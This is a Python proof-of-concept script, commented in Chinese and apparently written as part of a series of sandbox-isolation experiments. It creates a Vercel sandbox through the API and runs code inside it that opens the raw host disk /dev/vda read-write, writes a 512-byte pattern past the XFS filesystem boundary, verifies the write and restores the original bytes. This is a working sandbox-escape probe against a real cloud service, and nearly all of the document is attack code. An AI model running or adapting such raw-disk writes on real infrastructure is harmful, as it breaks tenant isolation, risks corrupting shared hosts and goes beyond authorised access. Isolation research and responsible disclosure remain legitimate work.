# 实验J37: vda 写能力测试 - 证明沙箱可写宿主 rootfs 磁盘 (隔离破坏严重度升级)
# 无害化: 目标=XFS 文件系统边界外盘尾未使用区, 只写 512B, 写后立即还原
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj37"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

SCAN = r'''
import os, struct

print("===== /dev/vda 设备权限 =====", flush=True)
st = os.stat("/dev/vda")
print("mode=%o uid=%d gid=%d" % (st.st_mode & 0o7777, st.st_uid, st.st_gid), flush=True)
import pwd, grp
try: print("uid name:", pwd.getpwuid(st.st_uid).pw_name, flush=True)
except Exception: pass

print("===== 定位写入目标 (XFS 文件系统边界外) =====", flush=True)
f = open("/dev/vda", "rb", buffering=0)
f.seek(0)
sb = f.read(512)
bs = struct.unpack_from(">I", sb, 0x04)[0]
dblocks = struct.unpack_from(">Q", sb, 0x08)[0]
magic = sb[:4]
f.seek(0, 2)
real_size = f.tell()
fs_end = dblocks * bs
print("magic=%r bs=%d dblocks=%d" % (magic, bs, dblocks), flush=True)
print("real_size=%d fs_end=%d outside=%d" % (real_size, fs_end, real_size - fs_end), flush=True)
if fs_end >= real_size:
    print("NO outside region - abort", flush=True)
    raise SystemExit

# 目标: fs_end 与盘尾之间未使用区的中点, 512 对齐
tgt = fs_end + ((real_size - fs_end) // 2)
tgt -= tgt % 512
print("target offset = %d (0x%x)" % (tgt, tgt), flush=True)

print("===== 步骤1: 读取原 512B =====", flush=True)
f.seek(tgt)
orig = f.read(512)
print("orig: %r" % orig[:64], flush=True)

print("===== 步骤2: 尝试以读写打开 =====", flush=True)
try:
    fd = os.open("/dev/vda", os.O_RDWR)
    print("open O_RDWR: OK fd=%d" % fd, flush=True)
except Exception as e:
    print("open O_RDWR FAILED: %r" % e, flush=True)
    print("RESULT: WRITE_DENIED", flush=True)
    raise SystemExit

print("===== 步骤3: 写入 512B 模式 =====", flush=True)
pattern = b"VDA-WRITE-TEST-" * 32  # 512B
os.lseek(fd, tgt, os.SEEK_SET)
n = os.write(fd, pattern)
print("wrote %d bytes" % n, flush=True)
try:
    os.fsync(fd)
    print("fsync: OK", flush=True)
except Exception as e:
    print("fsync: %r (non-fatal)" % e, flush=True)

print("===== 步骤4: 读回验证 =====", flush=True)
f.seek(tgt)
rb = f.read(512)
same = (rb == pattern)
print("readback match: %s" % same, flush=True)
if not same:
    print("readback: %r" % rb[:64], flush=True)
    print("RESULT: WRITE_IGNORED (COW/RO mapping)", flush=True)
    # 仍然还原
    os.lseek(fd, tgt, os.SEEK_SET)
    os.write(fd, orig)
    os.close(fd)
    raise SystemExit

print("===== 步骤5: 还原原 512B =====", flush=True)
os.lseek(fd, tgt, os.SEEK_SET)
os.write(fd, orig)
try:
    os.fsync(fd)
except Exception:
    pass
os.close(fd)
f.seek(tgt)
rb2 = f.read(512)
restored = (rb2 == orig)
print("restore match: %s" % restored, flush=True)

print("===== 步骤6: 交叉验证 (再读一次) =====", flush=True)
f.seek(tgt)
rb3 = f.read(512)
print("final match orig: %s" % (rb3 == orig), flush=True)

if same and restored:
    print("RESULT: WRITE_OK - sandbox can WRITE host rootfs disk (vda)", flush=True)
else:
    print("RESULT: AMBIGUOUS same=%s restored=%s" % (same, restored), flush=True)
'''
run_cmd(sid, SCAN, "vda-write-test", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
